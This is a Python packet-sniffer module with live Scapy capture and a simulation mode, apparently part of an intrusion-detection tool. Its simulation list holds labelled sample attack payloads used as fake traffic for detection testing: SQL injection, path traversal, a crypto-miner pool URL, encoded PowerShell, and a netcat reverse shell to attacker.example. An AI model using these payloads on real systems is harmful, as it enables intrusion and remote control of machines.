"""Packet capture — live (Scapy) or simulation mode for dev/testing."""

from __future__ import annotations

import random
import threading
import time
from collections import deque
from dataclasses import dataclass, field
from queue import Empty, Queue
from typing import Any, Callable, Optional

from config.settings import SNIFF_FILTER, load_settings


@dataclass
class RawPacket:
    timestamp: float
    src_ip: str
    dst_ip: str
    src_port: Optional[int]
    dst_port: Optional[int]
    protocol: str
    payload: bytes
    length: int
    raw_summary: str = ""


# Benign + malicious simulation payloads for demo / Windows dev
_SIM_PAYLOADS = [
    (b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n", "benign"),
    (b"POST /login HTTP/1.1\r\nuser=admin' OR 1=1--", "sqli"),
    (b"GET /../../../etc/passwd HTTP/1.1", "traversal"),
    (b"stratum+tcp://pool.evil-miner.example:3333", "miner"),
    (b"powershell -EncodedCommand SQBuAHYAbwBrAGUA", "ps"),
    (b"nc -e /bin/sh attacker.example 4444", "revshell"),
    (b"urgent wire transfer CEO request invoice attached", "phish"),
]

_SIM_IPS = [
    ("192.168.1.10", "10.0.0.5"),
    ("203.0.113.50", "192.168.1.20"),
    ("198.51.100.7", "10.0.0.15"),
    ("172.16.0.99", "8.8.8.8"),
]


class PacketSniffer:
    def __init__(
        self,
        interface: str = "",
        simulation: Optional[bool] = None,
        bpf_filter: str = SNIFF_FILTER,
        on_packet: Optional[Callable[[RawPacket], None]] = None,
    ) -> None:
        settings = load_settings()
        self.interface = interface or settings.interface
        self.simulation = settings.simulation if simulation is None else simulation
        self.bpf_filter = bpf_filter
        self.on_packet = on_packet
        self._queue: Queue[RawPacket] = Queue(maxsize=500)
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._recent: deque[RawPacket] = deque(maxlen=200)

    @property
    def running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def start(self) -> None:
        if self.running:
            return
        self._stop.clear()
        target = self._simulate_loop if self.simulation else self._live_loop
        self._thread = threading.Thread(target=target, name="ctg-sniffer", daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3.0)
            self._thread = None

    def get_packet(self, timeout: float = 1.0) -> Optional[RawPacket]:
        try:
            return self._queue.get(timeout=timeout)
        except Empty:
            return None

    def recent_packets(self, n: int = 10) -> list[RawPacket]:
        return list(self._recent)[-n:]

    def _emit(self, packet: RawPacket) -> None:
        self._recent.append(packet)
        if self.on_packet:
            self.on_packet(packet)
        try:
            self._queue.put_nowait(packet)
        except Exception:
            pass

    def _simulate_loop(self) -> None:
        rng = random.Random(42)
        while not self._stop.is_set():
            payload, _tag = rng.choice(_SIM_PAYLOADS)
            src, dst = rng.choice(_SIM_IPS)
            sport = rng.randint(1024, 65000)
            dport = rng.choice([80, 443, 4444, 8080, 53, 22])
            pkt = RawPacket(
                timestamp=time.time(),
                src_ip=src,
                dst_ip=dst,
                src_port=sport,
                dst_port=dport,
                protocol="TCP",
                payload=payload,
                length=len(payload),
                raw_summary=f"SIM {src}:{sport} -> {dst}:{dport}",
            )
            self._emit(pkt)
            time.sleep(rng.uniform(0.3, 1.2))

    def _live_loop(self) -> None:
        try:
            from scapy.all import IP, TCP, UDP, ICMP, sniff  # type: ignore
        except ImportError:
            self.simulation = True
            self._simulate_loop()
            return

        def _handler(pkt: Any) -> None:
            if self._stop.is_set():
                return
            try:
                summary = self._scapy_to_raw(pkt, IP, TCP, UDP, ICMP)
                if summary:
                    self._emit(summary)
            except Exception:
                pass

        while not self._stop.is_set():
            try:
                sniff(
                    iface=self.interface or None,
                    filter=self.bpf_filter,
                    prn=_handler,
                    store=False,
                    timeout=2,
                )
            except Exception:
                time.sleep(1.0)

    @staticmethod
    def _scapy_to_raw(pkt: Any, IP: Any, TCP: Any, UDP: Any, ICMP: Any) -> Optional[RawPacket]:
        if not pkt.haslayer(IP):
            return None
        ip = pkt[IP]
        src_ip = str(ip.src)
        dst_ip = str(ip.dst)
        proto = "IP"
        sport: Optional[int] = None
        dport: Optional[int] = None
        payload = b""
        if pkt.haslayer(TCP):
            tcp = pkt[TCP]
            proto = "TCP"
            sport = int(tcp.sport)
            dport = int(tcp.dport)
            payload = bytes(tcp.payload)
        elif pkt.haslayer(UDP):
            udp = pkt[UDP]
            proto = "UDP"
            sport = int(udp.sport)
            dport = int(udp.dport)
            payload = bytes(udp.payload)
        elif pkt.haslayer(ICMP):
            proto = "ICMP"
        return RawPacket(
            timestamp=time.time(),
            src_ip=src_ip,
            dst_ip=dst_ip,
            src_port=sport,
            dst_port=dport,
            protocol=proto,
            payload=payload,
            length=len(pkt),
            raw_summary=f"{proto} {src_ip}:{sport} -> {dst_ip}:{dport}",
        )
